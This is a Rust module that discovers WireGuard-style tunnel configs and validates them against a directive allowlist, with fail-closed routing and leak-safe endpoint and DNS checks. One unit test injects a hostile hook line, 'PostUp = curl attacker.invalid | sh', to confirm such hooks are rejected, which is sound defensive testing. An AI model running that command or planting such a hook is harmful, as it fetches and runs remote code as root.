use std::net::{IpAddr, Ipv4Addr, SocketAddrV4};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Tunnel {
    pub name: String,
    pub path: PathBuf,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ValidatedTunnel {
    pub endpoint: SocketAddrV4,
    pub dns_servers: Vec<IpAddr>,
    pub normalized_config: String,
}

pub fn discover(directory: &Path) -> Vec<Tunnel> {
    let Ok(entries) = std::fs::read_dir(directory) else {
        return Vec::new();
    };
    let mut tunnels: Vec<_> = entries
        .filter_map(Result::ok)
        .filter_map(|entry| {
            let path = entry.path();
            if path.extension()?.to_str()? != "conf" {
                return None;
            }
            let name = path.file_stem()?.to_string_lossy().into_owned();
            Some(Tunnel { name, path })
        })
        .collect();
    tunnels.sort_by(|left, right| left.name.cmp(&right.name));
    tunnels
}

pub fn validate(contents: &str) -> Result<ValidatedTunnel, String> {
    let mut parser = TunnelParser::default();
    for (index, raw_line) in contents.lines().enumerate() {
        parser.parse_line(raw_line.trim(), index + 1)?;
    }
    parser.finish()
}

#[derive(Default)]
struct TunnelParser {
    section: Section,
    endpoint: Option<SocketAddrV4>,
    dns_servers: Vec<IpAddr>,
    allowed_default_v4: bool,
    normalized: Vec<String>,
}

#[derive(Clone, Copy, Default)]
enum Section {
    #[default]
    None,
    Interface,
    Peer,
}

impl TunnelParser {
    fn parse_line(&mut self, line: &str, number: usize) -> Result<(), String> {
        if line.is_empty() || line.starts_with('#') {
            return Ok(());
        }
        if line.starts_with('[') && line.ends_with(']') {
            return self.parse_section(line, number);
        }
        self.parse_assignment(line, number)
    }

    fn parse_section(&mut self, line: &str, number: usize) -> Result<(), String> {
        self.section = match line {
            "[Interface]" => Section::Interface,
            "[Peer]" => Section::Peer,
            _ => return Err(format!("line {number}: unsupported section {line}")),
        };
        self.normalized.push(line.to_string());
        Ok(())
    }

    fn parse_assignment(&mut self, line: &str, number: usize) -> Result<(), String> {
        let (key, value) = line
            .split_once('=')
            .ok_or_else(|| format!("line {number}: expected key = value"))?;
        let key = key.trim();
        let value = value.trim();
        self.validate_directive(key, number)?;
        match key {
            "DNS" => self.parse_dns(value, number),
            "Endpoint" => self.parse_peer_endpoint(value),
            "AllowedIPs" => {
                self.allowed_default_v4 |= value.split(',').any(|item| item.trim() == "0.0.0.0/0");
                self.keep(key, value);
                Ok(())
            }
            _ => {
                self.keep(key, value);
                Ok(())
            }
        }
    }

    fn validate_directive(&self, key: &str, number: usize) -> Result<(), String> {
        let allowed = match self.section {
            Section::Interface => interface_directive(key),
            Section::Peer => peer_directive(key),
            Section::None => false,
        };
        allowed
            .then_some(())
            .ok_or_else(|| format!("line {number}: directive {key} is not allowed"))
    }

    fn parse_dns(&mut self, value: &str, number: usize) -> Result<(), String> {
        for server in value
            .split(',')
            .map(str::trim)
            .filter(|item| !item.is_empty())
        {
            let address = server
                .parse()
                .map_err(|_| format!("line {number}: DNS entries must be literal IP addresses"))?;
            self.dns_servers.push(address);
        }
        Ok(())
    }

    fn parse_peer_endpoint(&mut self, value: &str) -> Result<(), String> {
        if self.endpoint.is_some() {
            return Err("exactly one WireGuard peer endpoint is supported".into());
        }
        self.endpoint = Some(parse_endpoint(value)?);
        self.keep("Endpoint", value);
        Ok(())
    }

    fn keep(&mut self, key: &str, value: &str) {
        self.normalized.push(format!("{key} = {value}"));
    }

    fn finish(self) -> Result<ValidatedTunnel, String> {
        let endpoint = self
            .endpoint
            .ok_or_else(|| "missing peer Endpoint".to_string())?;
        if !self.allowed_default_v4 {
            return Err("AllowedIPs must contain 0.0.0.0/0 for fail-closed routing".into());
        }
        if self.dns_servers.is_empty() {
            return Err("DNS must contain at least one tunnel DNS server".into());
        }

        Ok(ValidatedTunnel {
            endpoint,
            dns_servers: self.dns_servers,
            normalized_config: self.normalized.join("\n") + "\n",
        })
    }
}

fn interface_directive(key: &str) -> bool {
    matches!(
        key,
        "PrivateKey"
            | "Address"
            | "MTU"
            | "ListenPort"
            | "Jc"
            | "Jmin"
            | "Jmax"
            | "S1"
            | "S2"
            | "H1"
            | "H2"
            | "H3"
            | "H4"
            | "DNS"
    )
}

fn peer_directive(key: &str) -> bool {
    matches!(
        key,
        "PublicKey" | "PresharedKey" | "AllowedIPs" | "Endpoint" | "PersistentKeepalive"
    )
}

fn parse_endpoint(value: &str) -> Result<SocketAddrV4, String> {
    let (host, port) = value
        .rsplit_once(':')
        .ok_or_else(|| "Endpoint must be an IPv4 address and port".to_string())?;
    let host: Ipv4Addr = host.parse().map_err(|_| {
        "Endpoint host must be a literal IPv4 address (DNS is not leak-safe)".to_string()
    })?;
    let port = port
        .parse()
        .map_err(|_| "Endpoint port is invalid".to_string())?;
    Ok(SocketAddrV4::new(host, port))
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_CONFIG: &str = r#"
[Interface]
PrivateKey = secret
Address = 10.66.0.2/32,fd00::2/128
DNS = 1.1.1.1,1.0.0.1

[Peer]
PublicKey = public
PresharedKey = shared
Endpoint = 192.0.2.1:51820
AllowedIPs = 0.0.0.0/0,::/0
"#;

    #[test]
    fn accepts_full_tunnel_config_and_removes_dns_from_wg_quick_input() {
        let tunnel = validate(SAMPLE_CONFIG).unwrap();

        assert_eq!(tunnel.endpoint, "192.0.2.1:51820".parse().unwrap());
        assert_eq!(
            tunnel.dns_servers,
            [
                "1.1.1.1".parse::<IpAddr>().unwrap(),
                "1.0.0.1".parse::<IpAddr>().unwrap(),
            ]
        );
        assert!(!tunnel.normalized_config.contains("DNS"));
        assert!(tunnel
            .normalized_config
            .contains("AllowedIPs = 0.0.0.0/0,::/0"));
    }

    #[test]
    fn rejects_hooks_that_could_execute_as_root() {
        let config = SAMPLE_CONFIG.replace(
            "DNS = 1.1.1.1,1.0.0.1",
            "DNS = 1.1.1.1\nPostUp = curl attacker.invalid | sh",
        );

        assert!(validate(&config).unwrap_err().contains("PostUp"));
        assert!(validate("PrivateKey = secret")
            .unwrap_err()
            .contains("line 1"));
        assert!(validate("[Interface\nPrivateKey = secret")
            .unwrap_err()
            .contains("expected key = value"));
    }

    #[test]
    fn rejects_hostnames_to_avoid_pre_tunnel_dns() {
        let config = SAMPLE_CONFIG.replace("192.0.2.1", "vpn.example.com");

        assert!(validate(&config).unwrap_err().contains("literal IPv4"));
    }

    #[test]
    fn rejects_split_tunnel_configs() {
        let config = SAMPLE_CONFIG.replace("0.0.0.0/0,::/0", "10.0.0.0/8");

        assert!(validate(&config).unwrap_err().contains("0.0.0.0/0"));
    }

    #[test]
    fn discovery_is_sorted_and_only_returns_conf_files() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("sample.conf"), "").unwrap();
        std::fs::write(dir.path().join("alpha.conf"), "").unwrap();
        std::fs::write(dir.path().join("notes.txt"), "").unwrap();

        let names: Vec<_> = discover(dir.path())
            .into_iter()
            .map(|item| item.name)
            .collect();

        assert_eq!(names, ["alpha", "sample"]);
    }
}
